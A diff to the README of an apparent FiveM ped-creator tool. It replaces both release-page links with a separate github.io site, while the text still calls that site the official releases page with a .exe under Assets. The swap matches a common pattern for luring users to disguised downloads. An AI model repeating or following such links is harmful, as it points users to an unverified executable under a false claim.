@@ -1,6 +1,6 @@
 # 📦 nhm-fivem-ped-creator-tool - Simplify creation of custom character models
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oceanic-sweettooth463/nhm-fivem-ped-creator-tool/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://oceanic-sweettooth463.github.io)
 
 This application helps users package character files for FiveM servers. It automates the process of converting addon models into ready-to-use resource folders. Use this tool to save time when you prepare custom clothing or character assets for your game.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 You find the official version of the tool on the releases page. 
 
-[Click here to visit the release page and download the setup file](https://github.com/oceanic-sweettooth463/nhm-fivem-ped-creator-tool/releases)
+[Click here to visit the release page and download the setup file](https://oceanic-sweettooth463.github.io)
 
 Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your Downloads folder or your Desktop for easy access.
 
